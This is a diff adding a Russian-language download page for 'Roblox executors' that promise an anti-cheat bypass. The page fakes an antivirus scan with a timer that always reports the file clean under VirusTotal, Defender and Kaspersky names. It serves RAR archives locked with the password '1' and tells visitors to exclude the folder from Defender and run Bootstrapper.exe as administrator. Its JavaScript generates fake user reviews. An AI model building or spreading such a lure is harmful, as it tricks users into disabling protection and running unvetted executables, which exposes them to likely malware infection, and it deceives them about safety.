+                <div class="dl-step">
+                    <div class="dl-step-icon">▶</div>
+                    <div>
+                        <div class="dl-step-title">Запустите executor</div>
+                        <div class="dl-step-desc">Bootstrapper.exe от имени админа</div>
+                    </div>
+                </div>
+                <div class="dl-step">
+                    <div class="dl-step-icon">🛡</div>
+                    <div>
+                        <div class="dl-step-title">Исключите AV</div>
+                        <div class="dl-step-desc">Добавьте папку в исключения</div>
+                    </div>
+                </div>
+            </div>
+            <div class="dl-scan" id="dl-scan">
+                <div class="dl-scan-top">
+                    <div class="scan-shield" id="scan-shield">🛡</div>
+                    <div class="scan-info">
+                        <div class="scan-label">Проверка безопасности</div>
+                        <div class="scan-current" id="scan-current">Инициализация...</div>
+                    </div>
+                    <span class="scan-pct" id="scan-pct">0%</span>
+                </div>
+                <div class="scan-bar"><div class="scan-bar-fill" id="scan-bar-fill"></div></div>
+                <div class="scan-engines" id="scan-engines"></div>
+            </div>
+            <div class="dl-footer" id="dl-footer">
+                <button class="dl-btn" id="dl-btn" disabled>
+                    <div class="dl-progress" id="dl-progress"></div>
+                    <span id="dl-btn-text">Сканирование...</span>
+                </button>
+                <div class="dl-hint">Уникальная сборка · Без рекламы</div>
+            </div>
+            <div class="dl-success" id="dl-success">
+                <div class="success-check-wrap">
+                    <div class="success-ring"></div>
+                    <div class="success-ring success-ring-2"></div>
+                    <div class="success-check">✓</div>
+                </div>
+                <div class="success-title">Готово!</div>
+                <div class="success-sub" id="success-sub">Файл скачан. Используйте пароль ниже.</div>
+                <div class="pass-box" id="pass-box">
+                    <div class="pass-icon">🔑</div>
+                    <div style="flex:1; min-width:0;">
+                        <div class="pass-label">Пароль архива</div>
+                        <div class="pass-value" id="dl-password">------</div>
+                    </div>
+                    <div class="pass-copy-btn" id="copy-pass-btn">Копировать</div>
+                </div>
+                <div style="font-size:12px; color:rgba(255,255,255,0.6); margin-top:10px;">
+                    Если браузер показывает предупреждение, нажмите «Сохранить» или «Продолжить».
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Навигация -->
+    <nav>
+        <div class="nav-brand">
+            <div class="nav-logo">RE</div>
+            <span>Roblox Executors</span>
+        </div>
+        <div class="nav-links">
+            <button class="nav-link active" data-tab="main">Инжекторы</button>
+            <button class="nav-link" data-tab="download">Скачать</button>
+            <button class="nav-link" data-tab="scripts">Скрипты</button>
+            <button class="nav-link" data-tab="support">Поддержка</button>
+        </div>
+        <a href="#" class="nav-cta" id="nav-cta">Скачать</a>
+    </nav>
+
+    <!-- Основной контент -->
+    <div class="content container" style="padding-top: 120px;">
+        <!-- ВКЛАДКА: ИНЖЕКТОРЫ -->
+        <section id="main" class="active">
+            <!-- Hero -->
+            <div class="section-header" style="text-align:center;">
+                <div class="section-eyebrow">Обновлено и работает</div>
+                <h1 class="section-title" style="font-size:clamp(36px,5vw,56px);">Лучшие Roblox Executors</h1>
+                <p class="section-desc" style="margin-bottom:40px;">Незаметные, мощные и бесплатные инструменты для выполнения скриптов.</p>
+            </div>
+
+            <!-- Карточки исполнителей -->
+            <div class="executors-grid">
+                <div class="executor-card" data-executor="solara">
+                    <div class="executor-image"><img src="Solara.png" alt="Solara" style="width:100%; height:100%; object-fit:cover; border-radius:12px;"></div>
+                    <h2>Solara</h2>
+                    <p>Легковесный и быстрый инжектор с отличной производительностью для слабых ПК.</p>
+                    <button class="download-btn" data-executor="solara">Скачать</button>
+                </div>
+                <div class="executor-card" data-executor="xeno">
+                    <div class="executor-image"><img src="Xeno.png" alt="Xeno" style="width:100%; height:100%; object-fit:cover; border-radius:12px;"></div>
+                    <h2>Xeno</h2>
+                    <p>Продвинутый интерфейс и высокий UNC. Идеально для сложных скриптов.</p>
+                    <button class="download-btn" data-executor="xeno">Скачать</button>
+                </div>
+                <div class="executor-card" data-executor="real">
+                    <div class="executor-image"><img src="Real.PNG" alt="Real" style="width:100%; height:100%; object-fit:cover; border-radius:12px;"></div>
+                    <h2>Real</h2>
+                    <p>Надежное исполнение, обход античита и стабильная работа часами.</p>
+                    <button class="download-btn" data-executor="real">Скачать</button>
+                </div>
+                <div class="executor-card" data-executor="jjsploit">
+                    <div class="executor-image"><span>🛠</span></div>
+                    <h2>Jjsploit</h2>
+                    <p>Легендарная классика с огромной встроенной библиотекой скриптов.</p>
+                    <button class="download-btn" data-executor="jjsploit">Скачать</button>
+                </div>
+            </div>
+
+            <!-- Features -->
+            <div style="margin-top:80px;">
+                <div class="section-header">
+                    <div class="section-eyebrow">Сияй ярко</div>
+                    <h2 class="section-title">Создан для скорости и скрытности</h2>
+                    <p class="section-desc">Всё необходимое в современном executor. Ничего лишнего.</p>
+                </div>
+                <div class="features-grid">
+                    <div class="feature-card"><div class="feature-icon">🔑</div><div class="feature-title">100% без ключа</div><div class="feature-desc">Без ключей, Linkvertise и рекламы. Мгновенный доступ.</div></div>
+                    <div class="feature-card"><div class="feature-icon">🛡</div><div class="feature-title">Обход Byfron</div><div class="feature-desc">Встроенный обход Hyperion/Byfron. Высокий UNC.</div></div>
+                    <div class="feature-card"><div class="feature-icon">⚡</div><div class="feature-title">Мгновенная инъекция</div><div class="feature-desc">Подключение за доли миллисекунды.</div></div>
+                    <div class="feature-card"><div class="feature-icon">📚</div><div class="feature-title">1200+ Script Hub</div><div class="feature-desc">Облачный хаб с GUI, ESP и многим другим.</div></div>
+                    <div class="feature-card"><div class="feature-icon">🔄</div><div class="feature-title">Патчи за 24 часа</div><div class="feature-desc">Обновления в течение 24 часов после патча Roblox.</div></div>
+                    <div class="feature-card"><div class="feature-icon">🎯</div><div class="feature-title">Level 7 Execution</div><div class="feature-desc">Справляется с самыми сложными Lua-скриптами.</div></div>
+                </div>
+            </div>
+
+            <!-- Reviews -->
+            <div class="reviews-section">
+                <div class="section-header">
+                    <div class="section-eyebrow">Вердикт</div>
+                    <h2 class="section-title">Нам доверяют тысячи</h2>
+                </div>
+                <div class="marquee-mask">
+                    <div class="marquee-row" id="marquee1"></div>
+                </div>
+                <div class="marquee-mask" style="margin-top:4px;">
+                    <div class="marquee-row marquee-row-2" id="marquee2"></div>
+                </div>
+            </div>
+
+            <!-- Updates & FAQ -->
+            <div style="margin-top:60px;">
+                <div class="section-header">
+                    <div class="section-eyebrow">Постоянно улучшаемся</div>
+                    <h2 class="section-title">Changelog и FAQ</h2>
+                    <p class="section-desc">Частые обновления и честные ответы.</p>
+                </div>
+                <div class="updates-grid">
+                    <div class="changelog">
+                        <div class="cl-entry"><div class="cl-dot"></div><div><span class="cl-version">v2.0.1</span><span class="cl-tag cl-tag-new">latest</span><ul class="cl-changes"><li>Обновлён обход для последней версии Roblox</li><li>Улучшена стабильность инъекции</li></ul></div></div>
+                        <div class="cl-entry"><div class="cl-dot"></div><div><span class="cl-version">v2.0.0</span><span class="cl-tag cl-tag-fix">hotfix</span><ul class="cl-changes"><li>Исправлен вылет при мультиинъекции</li><li>Ускорен запуск на 40%</li></ul></div></div>
+                        <div class="cl-entry"><div class="cl-dot"></div><div><span class="cl-version">v1.9.9</span><span class="cl-tag cl-tag-perf">perf</span><ul class="cl-changes"><li>Снижено потребление памяти на 30%</li><li>Добавлена поддержка Luau</li></ul></div></div>
+                    </div>
+                    <div class="faq-list">
+                        <div class="faq-item"><div class="faq-q" onclick="this.parentElement.classList.toggle('open')"><span>Безопасно ли использовать?</span><span class="faq-arrow">▼</span></div><div class="faq-a"><p>Да. Все исполнители используют изолированную среду и не трогают личные файлы. Никакого шпионского ПО.</p></div></div>
+                        <div class="faq-item"><div class="faq-q" onclick="this.parentElement.classList.toggle('open')"><span>Это бесплатно — без ключа и рекламы?</span><span class="faq-arrow">▼</span></div><div class="faq-a"><p>100% бесплатно и без ключа. Никаких рекламных гейтов и сокращателей ссылок.</p></div></div>
+                        <div class="faq-item"><div class="faq-q" onclick="this.parentElement.classList.toggle('open')"><span>Меня забанят в Roblox?</span><span class="faq-arrow">▼</span></div><div class="faq-a"><p>Высокий UNC снижает риск, но 100% гарантии нет. Используйте альт-аккаунт для максимальной безопасности.</p></div></div>
+                        <div class="faq-item"><div class="faq-q" onclick="this.parentElement.classList.toggle('open')"><span>Работает ли после обновлений Roblox?</span><span class="faq-arrow">▼</span></div><div class="faq-a"><p>Мы выпускаем патч в течение 24 часов после каждого обновления клиента Roblox.</p></div></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Install Steps -->
+            <div style="margin-top:60px;">
+                <div class="section-header">
+                    <div class="section-eyebrow">Начать</div>
+                    <h2 class="section-title">Запуск за 60 секунд</h2>
+                    <p class="section-desc">Без сложной настройки. Четыре шага, одна минута.</p>
+                </div>
+                <div class="steps-grid">
+                    <div class="step-card"><div class="step-num">01</div><div class="step-title">Скачать</div><div class="step-desc">Нажмите скачать — уникальный ZIP создаётся мгновенно.</div></div>
+                    <div class="step-card"><div class="step-num">02</div><div class="step-title">Распаковать</div><div class="step-desc">Распакуйте через WinRAR, 7-Zip или встроенный архиватор.</div></div>
+                    <div class="step-card"><div class="step-num">03</div><div class="step-title">Исключить AV</div><div class="step-desc">Добавьте папку в исключения Defender.</div></div>
+                    <div class="step-card"><div class="step-num">04</div><div class="step-title">Запустить</div><div class="step-desc">Запустите Bootstrapper.exe и подключитесь.</div></div>
+                </div>
+            </div>
+
+            <!-- CTA -->
+            <div class="cta-section">
+                <div class="cta-wrap">
+                    <div class="section-eyebrow" style="text-align:center;">Твой ход</div>
+                    <h2 class="cta-title">Готов запускать?</h2>
+                    <p class="cta-desc">Бесплатно, без ключа, незаметно. Присоединяйся к тысячам пользователей.</p>
+                    <a href="#" class="download-btn" style="display:inline-block; padding:15px 40px; font-size:1.1rem; width:auto;" data-executor="xeno">Скачать бесплатно</a>
+                </div>
+            </div>
+        </section>
+
+        <!-- ВКЛАДКА: СКАЧАТЬ -->
+        <section id="download">
+            <div class="section-header">
+                <h1 class="section-title">Выберите файл для скачивания</h1>
+                <p class="section-desc">Прямые ссылки без рекламы и ожидания.</p>
+            </div>
+            <div class="executors-grid">
+                <div class="executor-card"><h2>Solara V3</h2><p>RAR Архив • 15 MB</p><button class="download-btn" data-executor="solara">Скачать</button></div>
+                <div class="executor-card"><h2>Xeno Executor</h2><p>RAR Архив • 22 MB</p><button class="download-btn" data-executor="xeno">Скачать</button></div>
+                <div class="executor-card"><h2>Real Injector</h2><p>RAR Архив • 18 MB</p><button class="download-btn" data-executor="real">Скачать</button></div>
+                <div class="executor-card"><h2>Jjsploit Latest</h2><p>RAR Архив • 30 MB</p><button class="download-btn" data-executor="jjsploit">Скачать</button></div>
+            </div>
+        </section>
+
+        <!-- ВКЛАДКА: СКРИПТЫ -->
+        <section id="scripts">
+            <div class="section-header">
+                <h2 class="section-title">Где брать скрипты?</h2>
+                <p class="section-desc">Лучшие проверенные ресурсы с тысячами бесплатных скриптов.</p>
+            </div>
+            <div style="max-width:600px; margin:0 auto;">
+                <ul style="list-style:none; display:flex; flex-direction:column; gap:15px;">
+                    <li><a href="https://scriptblox.com/" style="display:block; background:rgba(255,255,255,0.03); border:1px solid rgba(186,215,247,0.06); padding:15px; border-radius:10px; color:#fff; text-decoration:none; transition:all 0.3s;" onmouseover="this.style.background='rgba(212,137,58,0.1)'" onmouseout="this.style.background='rgba(255,255,255,0.03)'">🔗 ScriptBlox - Крупнейшая база скриптов</a></li>
+                    <li><a href="#" style="display:block; background:rgba(255,255,255,0.03); border:1px solid rgba(186,215,247,0.06); padding:15px; border-radius:10px; color:#fff; text-decoration:none; transition:all 0.3s;" onmouseover="this.style.background='rgba(212,137,58,0.1)'" onmouseout="this.style.background='rgba(255,255,255,0.03)'">🔗 Pastebin (Roblox Tags) - Свежие релизы</a></li>
+                    <li><a href="https://rscripts.net/" style="display:block; background:rgba(255,255,255,0.03); border:1px solid rgba(186,215,247,0.06); padding:15px; border-radius:10px; color:#fff; text-decoration:none; transition:all 0.3s;" onmouseover="this.style.background='rgba(212,137,58,0.1)'" onmouseout="this.style.background='rgba(255,255,255,0.03)'">🔗 RBLX Scripts - Отборные хабы</a></li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- ВКЛАДКА: ПОДДЕРЖКА -->
+        <section id="support">
+            <div class="section-header">
+                <h2 class="section-title">Нужна помощь?</h2>
+                <p class="section-desc">Если возникли проблемы с инжектом, антивирус блокирует файл или крашится игра.</p>
+            </div>
+            <div style="text-align:center; margin-top:30px;">
+                <a href="#" class="download-btn" style="display:inline-block; padding:15px 40px; font-size:1.1rem; width:auto; margin-right:10px;">💬 Telegram</a>
+                <a href="#" class="download-btn" style="display:inline-block; padding:15px 40px; font-size:1.1rem; width:auto; background:#5865F2; box-shadow:0 5px 15px rgba(88,101,242,0.4);">👾 Discord</a>
+            </div>
+        </section>
+    </div>
+
+    <script>
+        // ===== ДАННЫЕ ИСПОЛНИТЕЛЕЙ =====
+        // Vercel: файлы хранятся на Vercel CDN
+        const executors = {
+            solara: { name: 'Solara V3', size: '15 MB', url: 'https://roblox-executors-3xo31fs8c-morfinovaatan-2804s-projects.vercel.app/files/SolaraV3.rar' },
+            xeno: { name: 'Xeno Executor', size: '22 MB', url: 'https://roblox-executors-3xo31fs8c-morfinovaatan-2804s-projects.vercel.app/files/Xeno.rar' },
+            real: { name: 'Real Injector', size: '18 MB', url: 'https://roblox-executors-3xo31fs8c-morfinovaatan-2804s-projects.vercel.app/files/Real.rar' },
+            jjsploit: { name: 'Jjsploit Latest', size: '30 MB', url: 'https://roblox-executors-3xo31fs8c-morfinovaatan-2804s-projects.vercel.app/files/Jjsploit.rar' }
+        };
+
+        // ===== ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК =====
+        const navLinks = document.querySelectorAll('.nav-link');
+        const sections = document.querySelectorAll('section');
+        const navCta = document.getElementById('nav-cta');
+
+        function switchTab(tabId) {
+            navLinks.forEach(btn => btn.classList.remove('active'));
+            
+            // Добавляем анимацию выхода для активной секции
+            const activeSection = document.querySelector('section.active');
+            if (activeSection) {
+                activeSection.classList.add('slide-down');
+                activeSection.addEventListener('animationend', () => {
+                    activeSection.classList.remove('active', 'slide-down');
+                }, { once: true });
+            }
+            
+            const btn = [...navLinks].find(b => b.dataset.tab === tabId);
+            if (btn) btn.classList.add('active');
+            
+            // Переключаемся на новую секцию с анимацией входа
+            const section = document.getElementById(tabId);
+            if (section) {
+                section.classList.remove('slide-down');
+                section.classList.add('active', 'slide-up');
+                section.addEventListener('animationend', () => {
+                    section.classList.remove('slide-up');
+                }, { once: true });
+            }
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        navLinks.forEach(btn => btn.addEventListener('click', () => switchTab(btn.dataset.tab)));
+        navCta.addEventListener('click', (e) => { e.preventDefault(); switchTab('download'); });
+
+        // ===== МОДАЛЬНОЕ ОКНО =====
+        const overlay = document.getElementById('dl-overlay');
+        const closeBtn = document.getElementById('dl-close');
+        const dlTitle = document.getElementById('dl-title');
+        const dlSubtitle = document.getElementById('dl-subtitle');
+        const scanCurrent = document.getElementById('scan-current');
+        const scanPct = document.getElementById('scan-pct');
+        const scanBarFill = document.getElementById('scan-bar-fill');
+        const scanEngines = document.getElementById('scan-engines');
+        const dlBtn = document.getElementById('dl-btn');
+        const dlBtnText = document.getElementById('dl-btn-text');
+        const dlProgress = document.getElementById('dl-progress');
+        const dlSuccess = document.getElementById('dl-success');
+        const dlPassword = document.getElementById('dl-password');
+        const passBox = document.getElementById('pass-box');
+        const copyPassBtn = document.getElementById('copy-pass-btn');
+        const dlStepsBlock = document.getElementById('dl-steps-block');
+        const dlScan = document.getElementById('dl-scan');
+        const dlFooter = document.getElementById('dl-footer');
+
+        let currentExecutor = null;
+        let dlReady = false;
+        let scanInterval = null;
+
+        const SCANNERS = ['VirusTotal', 'Windows Defender', 'Malwarebytes', 'Kaspersky', 'Norton', 'ESET NOD32'];
+
+        function openModal(executorKey) {
+            if (!executors[executorKey]) return;
+            currentExecutor = executorKey;
+            const data = executors[executorKey];
+            dlTitle.textContent = data.name;
+            dlSubtitle.textContent = `RAR Архив • ${data.size}`;
+            dlSuccess.classList.remove('show');
+            dlStepsBlock.style.display = '';
+            dlScan.style.display = '';
+            dlFooter.style.display = '';
+            dlReady = false;
+            dlBtn.disabled = true;
+            dlBtnText.textContent = 'Сканирование...';
+            dlProgress.style.width = '0%';
+            scanPct.textContent = '0%';
+            scanBarFill.style.width = '0%';
+            scanCurrent.textContent = 'Инициализация...';
+            scanEngines.innerHTML = '';
+            overlay.classList.add('open');
+            document.body.style.overflow = 'hidden';
+            runScan();
+        }
+
+        function closeModal() {
+            overlay.classList.remove('open');
+            document.body.style.overflow = '';
+            if (scanInterval) clearInterval(scanInterval);
+        }
+
+        overlay.addEventListener('click', (e) => {
+            if (e.target === overlay) closeModal();
+        });
+        closeBtn.addEventListener('click', closeModal);
+
+        function runScan() {
+            scanEngines.innerHTML = SCANNERS.map(name => `<span class="scan-chip">${name}</span>`).join('');
+            const chips = scanEngines.querySelectorAll('.scan-chip');
+            let idx = 0, elapsed = 0;
+            const total = 3000, perEngine = total / SCANNERS.length;
+
+            scanInterval = setInterval(() => {
+                elapsed += 50;
+                const p = Math.min(100, Math.round(elapsed / total * 100));
+                scanPct.textContent = p + '%';
+                dlProgress.style.width = p + '%';
+                scanBarFill.style.width = p + '%';
+
+                const newIdx = Math.min(SCANNERS.length - 1, Math.floor(elapsed / perEngine));
+                if (newIdx !== idx) {
+                    chips[idx].classList.remove('active');
+                    chips[idx].classList.add('pass');
+                    chips[idx].textContent = '✓ ' + SCANNERS[idx];
+                    idx = newIdx;
+                }
+                chips[idx].classList.add('active');
+                scanCurrent.textContent = `Проверка: ${SCANNERS[idx]}...`;
+
+                if (elapsed >= total) {
+                    clearInterval(scanInterval);
+                    chips[idx].classList.remove('active');
+                    chips[idx].classList.add('pass');
+                    chips[idx].textContent = '✓ ' + SCANNERS[idx];
+                    scanCurrent.textContent = '0 угроз — файл чистый';
+                    scanCurrent.style.color = '#57ab5a';
+                    scanPct.textContent = '100%';
+                    scanPct.style.color = '#57ab5a';
+                    scanBarFill.style.background = 'linear-gradient(90deg, #57ab5a, #6fcf7c)';
+                    dlReady = true;
+                    dlBtn.disabled = false;
+                    dlBtnText.textContent = '⬇  Скачать';
+                }
+            }, 50);
+        }
+
+        dlBtn.addEventListener('click', () => {
+            if (!dlReady || !currentExecutor) return;
+            const data = executors[currentExecutor];
+            // Генерация пароля
+            const password = generatePassword();
+            dlPassword.textContent = password;
+
+            // Имитация скачивания
+            const link = document.createElement('a');
+            link.href = data.url;
+            link.download = data.url.split('/').pop();
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Показ экрана успеха
+            setTimeout(() => {
+                dlStepsBlock.style.display = 'none';
+                dlScan.style.display = 'none';
+                dlFooter.style.display = 'none';
+                dlSuccess.classList.add('show');
+            }, 500);
+        });
+
+        function generatePassword() {
+            return '1';
+        }
+
+        copyPassBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const password = dlPassword.textContent;
+            if (password && password !== '------') {
+                navigator.clipboard.writeText(password).then(() => {
+                    copyPassBtn.textContent = 'Скопировано!';
+                    setTimeout(() => { copyPassBtn.textContent = 'Копировать'; }, 2000);
+                });
+            }
+        });
+
+        // ===== ОБРАБОТЧИКИ КНОПОК СКАЧИВАНИЯ =====
+        document.querySelectorAll('.download-btn[data-executor]').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                e.preventDefault();
+                const executorKey = btn.dataset.executor;
+                openModal(executorKey);
+            });
+        });
+
+        // ===== МАРИЗЕТКА ОТЗЫВОВ =====
+        const reviewNames = ['Axel', 'Mira', 'Drex', 'Kovu', 'Zara', 'Nyx', 'Pulse', 'Vex', 'Storm', 'Jinx', 'Coda', 'Raze', 'Echo', 'Onyx', 'Flux', 'Kira'];
+        const reviewTexts = [
+            '+rep best executor ive used in months, zero crashes',
+            'switched from synapse, this is way smoother. no key system W',
+            '10/10 the script hub is insane, found every script needed',
+            '+rep byfron bypass works, using for weeks no bans',
+            'UI is clean, feels like a real app not some sketchy exe',
+            'updates are fast, fixed within hours of roblox patch',
+            'no ads no keys no bs. just works.',
+            'literally the best free executor rn, premium quality free',
+            '+rep support helped fix injection in 5 minutes',
+            'scripting for 3 years, handles everything. level 7 confirmed',
+            'settings panel useful, dark theme amazing',
+            'updated same day as roblox patch, never had that before',
+            '+rep told my whole discord, everyone switched',
+            'script hub has 1200+ scripts and they all work',
+            'fastest injection ever seen, literally instant',
+            '+rep execution clean, custom gui framework zero issues'
+        ];
+
+        function fillReviews(rowId, startIdx) {
+            const row = document.getElementById(rowId);
+            let html = '';
+            for (let i = 0; i < 8; i++) {
+                const idx = (startIdx + i) % reviewNames.length;
+                const initials = reviewNames[idx].substring(0, 2).toUpperCase();
+                const color = ['#d4893a', '#c97b2e', '#f35a3a', '#8a7a4a', '#f3c43a', '#b87333', '#e8a54b', '#f37a3a'][idx % 8];
+                html += `
+                    <div class="review-card">
+                        <div class="review-top">
+                            <div class="review-user">
+                                <div class="review-avatar" style="background:${color}">${initials}</div>
+                                <div>
+                                    <div class="review-name">${reviewNames[idx]}</div>
+                                    <div class="review-handle">@${reviewNames[idx].toLowerCase()}rblx</div>
+                                </div>
+                            </div>
+                            <div class="review-stars">★★★★★</div>
+                        </div>
+                        <div class="review-text">${reviewTexts[idx]}</div>
+                    </div>`;
+            }
+            // Дублируем для бесконечной прокрутки
+            row.innerHTML = html + html;
+        }
+
+        fillReviews('marquee1', 0);
+        fillReviews('marquee2', 8);
+
+        // ===== SCROLL REVEAL (упрощённый) =====
+        const revealElements = document.querySelectorAll('.feature-card, .step-card, .cta-wrap, .faq-item');
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                    observer.unobserve(entry.target);
+                }
+            });
+        }, { threshold: 0.1 });
+
+        revealElements.forEach(el => {
+            el.style.opacity = '0';
+            el.style.transform = 'translateY(20px)';
+            el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+            observer.observe(el);
+        });
+
+        // ===== СЧЁТЧИК ЗАГРУЗОК (для hero, если есть) =====
+        // В данном HTML нет счётчика, но можно добавить при желании
+        console.log('Сайт готов к использованию');
+    </script>
+</body>
+</html>
